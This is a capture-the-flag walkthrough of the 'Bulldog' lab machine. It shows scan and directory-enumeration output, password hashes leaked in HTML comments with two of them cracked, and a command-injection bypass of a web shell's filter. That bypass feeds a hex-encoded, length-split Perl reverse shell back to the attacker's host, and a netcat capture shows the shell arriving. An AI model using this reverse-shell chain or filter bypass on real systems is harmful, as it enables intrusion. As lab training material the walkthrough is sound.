---
title: Bulldog-Industries

date: "2023-05-23"

author: MatDef

  

---

# Information Gathering
 

### Nmap
```shell
nmap 192.168.1.155 -A -Pn -p- --script=vuln 

Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-29 12:02 CEST
Nmap scan report for 192.168.1.155
Host is up (0.00012s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
23/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| vulners: 
|   cpe:/a:openbsd:openssh:7.2p2: 
|     	PACKETSTORM:140070	7.8	https://vulners.com/packetstorm/PACKETSTORM:140070	*EXPLOIT*
|     	EXPLOITPACK:5BCA798C6BA71FAE29334297EC0B6A09	7.8	https://vulners.com/exploitpack/EXPLOITPACK:5BCA798C6BA71FAE29334297EC0B6A09	*EXPLOIT*
|     	EDB-ID:40888	7.8	https://vulners.com/exploitdb/EDB-ID:40888	*EXPLOIT*
|     	CVE-2016-8858	7.8	https://vulners.com/cve/CVE-2016-8858
|     	CVE-2016-6515	7.8	https://vulners.com/cve/CVE-2016-6515
|     	1337DAY-ID-26494	7.8	https://vulners.com/zdt/1337DAY-ID-26494	*EXPLOIT*
|     	SSV:92579	7.5	https://vulners.com/seebug/SSV:92579	*EXPLOIT*
|     	CVE-2016-10009	7.5	https://vulners.com/cve/CVE-2016-10009
|     	1337DAY-ID-26576	7.5	https://vulners.com/zdt/1337DAY-ID-26576	*EXPLOIT*
|     	SSV:92582	7.2	https://vulners.com/seebug/SSV:92582	*EXPLOIT*
|     	CVE-2016-10012	7.2	https://vulners.com/cve/CVE-2016-10012
|     	CVE-2015-8325	7.2	https://vulners.com/cve/CVE-2015-8325
|     	SSV:92580	6.9	https://vulners.com/seebug/SSV:92580	*EXPLOIT*
|     	CVE-2016-10010	6.9	https://vulners.com/cve/CVE-2016-10010
|     	1337DAY-ID-26577	6.9	https://vulners.com/zdt/1337DAY-ID-26577	*EXPLOIT*
|     	EXPLOITPACK:98FE96309F9524B8C84C508837551A19	5.8	https://vulners.com/exploitpack/EXPLOITPACK:98FE96309F9524B8C84C508837551A19	*EXPLOIT*
|     	EXPLOITPACK:5330EA02EBDE345BFC9D6DDDD97F9E97	5.8	https://vulners.com/exploitpack/EXPLOITPACK:5330EA02EBDE345BFC9D6DDDD97F9E97	*EXPLOIT*
|     	EDB-ID:46516	5.8	https://vulners.com/exploitdb/EDB-ID:46516	*EXPLOIT*
|     	EDB-ID:46193	5.8	https://vulners.com/exploitdb/EDB-ID:46193	*EXPLOIT*
|     	CVE-2019-6111	5.8	https://vulners.com/cve/CVE-2019-6111
|     	1337DAY-ID-32328	5.8	https://vulners.com/zdt/1337DAY-ID-32328	*EXPLOIT*
|     	1337DAY-ID-32009	5.8	https://vulners.com/zdt/1337DAY-ID-32009	*EXPLOIT*
|     	SSV:91041	5.5	https://vulners.com/seebug/SSV:91041	*EXPLOIT*
|     	PACKETSTORM:140019	5.5	https://vulners.com/packetstorm/PACKETSTORM:140019	*EXPLOIT*
|     	PACKETSTORM:136234	5.5	https://vulners.com/packetstorm/PACKETSTORM:136234	*EXPLOIT*
|     	EXPLOITPACK:F92411A645D85F05BDBD274FD222226F	5.5	https://vulners.com/exploitpack/EXPLOITPACK:F92411A645D85F05BDBD274FD222226F	*EXPLOIT*
|     	EXPLOITPACK:9F2E746846C3C623A27A441281EAD138	5.5	https://vulners.com/exploitpack/EXPLOITPACK:9F2E746846C3C623A27A441281EAD138	*EXPLOIT*
|     	EXPLOITPACK:1902C998CBF9154396911926B4C3B330	5.5	https://vulners.com/exploitpack/EXPLOITPACK:1902C998CBF9154396911926B4C3B330	*EXPLOIT*
|     	EDB-ID:40858	5.5	https://vulners.com/exploitdb/EDB-ID:40858	*EXPLOIT*
|     	EDB-ID:40119	5.5	https://vulners.com/exploitdb/EDB-ID:40119	*EXPLOIT*
|     	EDB-ID:39569	5.5	https://vulners.com/exploitdb/EDB-ID:39569	*EXPLOIT*
|     	CVE-2016-3115	5.5	https://vulners.com/cve/CVE-2016-3115
|     	SSH_ENUM	5.0	https://vulners.com/canvas/SSH_ENUM	*EXPLOIT*
|     	PACKETSTORM:150621	5.0	https://vulners.com/packetstorm/PACKETSTORM:150621	*EXPLOIT*
|     	EXPLOITPACK:F957D7E8A0CC1E23C3C649B764E13FB0	5.0	https://vulners.com/exploitpack/EXPLOITPACK:F957D7E8A0CC1E23C3C649B764E13FB0	*EXPLOIT*
|     	EXPLOITPACK:EBDBC5685E3276D648B4D14B75563283	5.0	https://vulners.com/exploitpack/EXPLOITPACK:EBDBC5685E3276D648B4D14B75563283	*EXPLOIT*
|     	EDB-ID:45939	5.0	https://vulners.com/exploitdb/EDB-ID:45939	*EXPLOIT*
|     	EDB-ID:45233	5.0	https://vulners.com/exploitdb/EDB-ID:45233	*EXPLOIT*
|     	CVE-2018-15919	5.0	https://vulners.com/cve/CVE-2018-15919
|     	CVE-2018-15473	5.0	https://vulners.com/cve/CVE-2018-15473
|     	CVE-2017-15906	5.0	https://vulners.com/cve/CVE-2017-15906
|     	CVE-2016-10708	5.0	https://vulners.com/cve/CVE-2016-10708
|     	1337DAY-ID-31730	5.0	https://vulners.com/zdt/1337DAY-ID-31730	*EXPLOIT*
|     	CVE-2021-41617	4.4	https://vulners.com/cve/CVE-2021-41617
|     	EXPLOITPACK:802AF3229492E147A5F09C7F2B27C6DF	4.3	https://vulners.com/exploitpack/EXPLOITPACK:802AF3229492E147A5F09C7F2B27C6DF	*EXPLOIT*
|     	EXPLOITPACK:5652DDAA7FE452E19AC0DC1CD97BA3EF	4.3	https://vulners.com/exploitpack/EXPLOITPACK:5652DDAA7FE452E19AC0DC1CD97BA3EF	*EXPLOIT*
|     	EDB-ID:40136	4.3	https://vulners.com/exploitdb/EDB-ID:40136	*EXPLOIT*
|     	EDB-ID:40113	4.3	https://vulners.com/exploitdb/EDB-ID:40113	*EXPLOIT*
|     	CVE-2023-29323	4.3	https://vulners.com/cve/CVE-2023-29323
|     	CVE-2020-14145	4.3	https://vulners.com/cve/CVE-2020-14145
|     	CVE-2016-6210	4.3	https://vulners.com/cve/CVE-2016-6210
|     	1337DAY-ID-25440	4.3	https://vulners.com/zdt/1337DAY-ID-25440	*EXPLOIT*
|     	1337DAY-ID-25438	4.3	https://vulners.com/zdt/1337DAY-ID-25438	*EXPLOIT*
|     	CVE-2019-6110	4.0	https://vulners.com/cve/CVE-2019-6110
|     	CVE-2019-6109	4.0	https://vulners.com/cve/CVE-2019-6109
|     	CVE-2018-20685	2.6	https://vulners.com/cve/CVE-2018-20685
|     	SSV:92581	2.1	https://vulners.com/seebug/SSV:92581	*EXPLOIT*
|     	CVE-2016-10011	2.1	https://vulners.com/cve/CVE-2016-10011
|     	PACKETSTORM:151227	0.0	https://vulners.com/packetstorm/PACKETSTORM:151227	*EXPLOIT*
|     	PACKETSTORM:140261	0.0	https://vulners.com/packetstorm/PACKETSTORM:140261	*EXPLOIT*
|     	PACKETSTORM:138006	0.0	https://vulners.com/packetstorm/PACKETSTORM:138006	*EXPLOIT*
|     	PACKETSTORM:137942	0.0	https://vulners.com/packetstorm/PACKETSTORM:137942	*EXPLOIT*
|     	MSF:AUXILIARY-SCANNER-SSH-SSH_ENUMUSERS-	0.0	https://vulners.com/metasploit/MSF:AUXILIARY-SCANNER-SSH-SSH_ENUMUSERS-*EXPLOIT*
|_    	1337DAY-ID-30937	0.0	https://vulners.com/zdt/1337DAY-ID-30937	*EXPLOIT*
80/tcp   open  http    WSGIServer 0.1 (Python 2.7.12)
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|   /robots.txt: Robots file
|_  /dev/: Potentially interesting folder
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_      http://ha.ckers.org/slowloris/
| http-fileupload-exploiter: 
|   
|     Couldn't find a file-type field.
|   
|_    Couldn't find a file-type field.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
8080/tcp open  http    WSGIServer 0.1 (Python 2.7.12)
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-fileupload-exploiter: 
|   
|     Couldn't find a file-type field.
|   
|_    Couldn't find a file-type field.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_      http://ha.ckers.org/slowloris/
| http-enum: 
|   /robots.txt: Robots file
|_  /dev/: Potentially interesting folder
|_http-csrf: Couldn't find any CSRF vulnerabilities.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 529.43 seconds

```
--> http-enum
/robots.txt
```shell
  ________                                       _________.__                  .__                     .___
 /  _____/  ___________  _____ _____    ____    /   _____/|  |__   ____ ______ |  |__   ___________  __| _/
/   \  ____/ __ \_  __ \/     \\__  \  /    \   \_____  \ |  |  \_/ __ \\____ \|  |  \_/ __ \_  __ \/ __ | 
\    \_\  \  ___/|  | \/  Y Y  \/ __ \|   |  \  /        \|   Y  \  ___/|  |_> >   Y  \  ___/|  | \/ /_/ | 
 \______  /\___  >__|  |__|_|  (____  /___|  / /_______  /|___|  /\___  >   __/|___|  /\___  >__|  \____ | 
        \/     \/            \/     \/     \/          \/      \/     \/|__|        \/     \/           \/ 
			  ___ ___                __     ___________                    
			 /   |   \_____    ____ |  | __ \__    ___/___ _____    _____  
			/    ~    \__  \ _/ ___\|  |/ /   |    |_/ __ \\__  \  /     \ 
			\    Y    // __ \\  \___|    <    |    |\  ___/ / __ \|  Y Y  \
			 \___|_  /(____  /\___  >__|_ \   |____| \___  >____  /__|_|  /
			       \/      \/     \/     \/              \/     \/      \/ 

						You got owned

```
-->/dev/
SCREENSHOT

![](./2023-05-29 12_46_40-kali-linux-2022.4 main (before kkklick) [Running] - Oracle VM VirtualBox.png)
-->
```html
<!--Need these password hashes for testing. Django's default is too complex-->
	<!--We'll remove these in prod. It's not like a hacker can do anything with a hash-->
	Team Lead: alan@bulldogindustries.com<br><!--6515229daf8dbdc8b89fed2e60f107433da5f2cb-->
	Back-up Team Lead: william@bulldogindustries.com<br><br><!--38882f3b81f8f2bc47d9f3119155b05f954892fb-->
	Front End: malik@bulldogindustries.com<br><!--c6f7e34d5d08ba4a40dd5627508ccb55b425e279-->
	Front End: kevin@bulldogindustries.com<br><br><!--0e6ae9fe8af1cd4192865ac97ebf6bda414218a9-->
	Back End: ashley@bulldogindustries.com<br><!--553d917a396414ab99785694afd51df3a8a8a3e0-->
	Back End: nick@bulldogindustries.com<br><br><!--ddf45997a7e18a25ad5f5cf222da64814dd060d5-->
	Database: sarah@bulldogindustries.com<br><!--d8b8dd5e7f000b8dea26ef8428caf38c04466b3e-->
```
--> SHA 1 
```shell
ddf45997a7e18a25ad5f5cf222da64814dd060d5:bulldog          
d8b8dd5e7f000b8dea26ef8428caf38c04466b3e:bulldoglover   
``` 

--> Bulldog Industries got hacked by German Shepard Hack Team (robots.txt); Security Team got fired; Instead of ssh: Webshell with specific valid commands


## Enumeration

### Nikto

```bash
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.1.155
+ Target Hostname:    192.168.1.155
+ Target Port:        80
+ Start Time:         2023-05-25 11:49:47 (GMT2)
---------------------------------------------------------------------------
+ Server: WSGIServer/0.1 Python/2.7.12
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ OSVDB-3092: /dev/: This might be interesting...
+ 7931 requests: 16 error(s) and 3 item(s) reported on remote host
+ End Time:           2023-05-25 11:49:58 (GMT2) (11 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```
-->nothing really interesting


### gobuster
```shell
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.155
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/05/29 12:37:12 Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 301) [Size: 0] [--> http://192.168.1.155/admin/]
/dev                  (Status: 301) [Size: 0] [--> http://192.168.1.155/dev/]
/notice               (Status: 301) [Size: 0] [--> http://192.168.1.155/notice/]
/robots-txt           (Status: 200) [Size: 1071]

===============================================================
2023/05/29 12:39:53 Finished
===============================================================
```
--> /admin : Login
--> /notice : informations
-->

```shell
gobuster dir -u http://192.168.1.1/dev/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt | tee gobuster_dev 
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.1/dev/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/05/29 12:39:21 Starting gobuster in directory enumeration mode
===============================================================
/rss                  (Status: 301) [Size: 0] [--> http://192.168.1.1/dev/feed/]
/feed                 (Status: 301) [Size: 0] [--> http://192.168.1.1/dev/feed/]
/atom                 (Status: 301) [Size: 0] [--> http://192.168.1.1/dev/feed/atom/]
/rss2                 (Status: 301) [Size: 0] [--> http://192.168.1.1/dev/feed/]
/rdf                  (Status: 301) [Size: 0] [--> http://192.168.1.1/dev/feed/rdf/]
/%20                  (Status: 301) [Size: 0] [--> http://192.168.1.1/dev/]


```
# Exploitation
Used One of the User-Passwords to authenticate to use the web shell.
![](./images/2023-05-29 13_34_21-kali-linux-2022.4 main (before kkklick) [Running] - Oracle VM VirtualBox.png)
Chaining Commands doesn't work with ; but with &&. -> Filtering/Sanitization doesn't work properly
![](./images/2023-05-29 13_39_47-kali-linux-2022.4 main (before kkklick) [Running] - Oracle VM VirtualBox.png)
Several ways to continue.

Writing a perl Reverse shell with Reverse Shell Generator (www.revshells.com):
- Web Form limit: 400 max length -> split up commands
- Encode ";" as Hex and convert it back to ASCII with xxd
- 
```shell
echo "" && echo "#!/bin/sh" > /tmp/revshell_perl.sh && echo -n "perl -e 'use Socket" >> /tmp/revshell_perl.sh && echo -n "0x3B" | xxd -r >> /tmp/revshell_perl.sh && echo -n "\$i=\"192.168.1.153\"" >> /tmp/revshell_perl.sh && echo -n "0x3B" | xxd -r >> /tmp/revshell_perl.sh &&
echo -n "\$p=1234" >> /tmp/revshell_perl.sh && echo -n "0x3B" | xxd -r >> /tmp/revshell_perl.sh

echo "" && echo -n "socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"))" >> /tmp/revshell_perl.sh && echo -n "0x3B" | xxd -r >> /tmp/revshell_perl.sh && echo -n "if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\")" >> /tmp/revshell_perl.sh && echo -n "0x3B" | xxd -r >> /tmp/revshell_perl.sh && echo -n "open(STDOUT,\">&S\")" >> /tmp/revshell_perl.sh 

echo "" && echo -n "0x3B" | xxd -r >> /tmp/revshell_perl.sh && echo -n "open(STDERR,\">&S\")" >> /tmp/revshell_perl.sh && echo -n "0x3B" | xxd -r >> /tmp/revshell_perl.sh && echo -n "exec(\"/bin/bash -i\")" >> /tmp/revshell_perl.sh && echo -n "0x3B" | xxd -r >> /tmp/revshell_perl.sh && echo -n "}" >> /tmp/revshell_perl.sh && echo -n "0x3B" | xxd -r >> /tmp/revshell_perl.sh 

echo "" &&  echo -n "'" >> /tmp/revshell_perl.sh && chmod +x /tmp/revshell_perl.sh

echo "" && /tmp/revshell_perl.sh
```
-> Got Access
```shell
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 1234 
listening on [any] 1234 ...
connect to [192.168.1.153] from (UNKNOWN) [192.168.1.155] 51838
bash: cannot set terminal process group (1032): Inappropriate ioctl for device
bash: no job control in this shell
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

bash: /root/.bashrc: Permission denied
django@bulldog:/home/django/bulldog$ ls
ls
bulldog
db.sqlite3
manage.py
```



# Privilege Escaltion

